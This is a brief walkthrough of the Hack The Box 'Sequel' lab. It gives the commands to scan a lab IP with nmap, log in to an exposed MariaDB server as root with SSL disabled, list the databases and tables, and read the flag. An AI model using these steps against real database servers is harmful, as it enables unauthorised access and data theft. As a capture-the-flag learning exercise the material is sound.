# MariaDB Exploitation (HTB Sequel)

## Steps

### 1. Scan the target IP for open ports and services
```bash
nmap -sV -sC 10.129.191.64
````

### 2. Identify MariaDB Service

* Port `3306` is open and running **MariaDB** service.

### 3. Connect to the MariaDB Server

```bash
mysql -u root -h 10.129.191.64 -p --skip-ssl
```

* `-u root` → Username (root)
* `-h 10.129.191.64` → Host IP
* `-p` → Prompt for password
* `--skip-ssl` → Disable SSL for connection

### 4. Explore the Database

Once connected:

```sql
SHOW DATABASES;                  -- List all databases
USE {database_name};              -- Select a database
SHOW TABLES;                      -- List tables in the current database
SELECT * FROM {table_name};       -- View all data in a table
```

### 5. Retrieve the Flag

From the accessible tables, extract the flag or any sensitive data:

```sql
SELECT * FROM flag_table;
```
